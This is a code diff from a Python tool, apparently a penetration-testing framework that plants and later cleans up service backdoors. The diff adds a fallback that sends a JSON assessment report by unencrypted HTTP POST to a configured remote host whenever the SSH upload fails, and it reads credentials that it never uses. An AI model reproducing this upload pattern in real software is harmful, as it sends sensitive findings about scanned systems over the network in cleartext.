@@ -3990,9 +3990,60 @@ WantedBy=multi-user.target
             ssh.close()
             print(f"✅ Reporte enviado exitosamente: {filename}")
             
+        except ImportError:
+            print("❌ Módulo 'paramiko' no encontrado. Intentando envío alternativo...")
+            self._upload_report_via_http(report_file)
         except Exception as e:
             print(f"❌ Error enviando reporte por SSH: {e}")
+            print("💡 Intentando envío alternativo...")
+            self._upload_report_via_http(report_file)
+    
+    def _upload_report_via_http(self, report_file: str):
+        """Envío alternativo por HTTP si SSH falla"""
+        try:
+            import urllib.request
+            import os
+            import json
+            
+            ssh_config = self.config_data['ssh_upload']
+            host = ssh_config['host']
+            username = ssh_config['username']
+            password = ssh_config['password']
+            
+            print(f"📤 Enviando reporte por HTTP a {host}...")
+            
+            # Leer el archivo de reporte
+            with open(report_file, 'r', encoding='utf-8') as f:
+                report_data = json.load(f)
+            
+            # Crear payload para envío
+            filename = os.path.basename(report_file)
+            payload = {
+                'filename': filename,
+                'report_data': report_data,
+                'timestamp': time.time()
+            }
+            
+            # Codificar como JSON
+            json_data = json.dumps(payload).encode('utf-8')
+            
+            # Crear request HTTP
+            url = f"http://{host}/upload_report"
+            req = urllib.request.Request(url, data=json_data)
+            req.add_header('Content-Type', 'application/json')
+            req.add_header('User-Agent', 'SimplifyWFB/1.0')
+            
+            # Enviar request
+            with urllib.request.urlopen(req, timeout=30) as response:
+                if response.status == 200:
+                    print(f"✅ Reporte enviado exitosamente por HTTP: {filename}")
+                else:
+                    print(f"⚠️ Respuesta HTTP {response.status}: {response.reason}")
+            
+        except Exception as e:
+            print(f"❌ Error enviando reporte por HTTP: {e}")
             print("💡 El reporte se mantiene localmente en el equipo")
+            print("💡 Para instalar paramiko: pip install paramiko")
     
     def _cleanup_vulnerable_service_backdoors(self):
         """Limpiar backdoors creados en servicios vulnerables"""
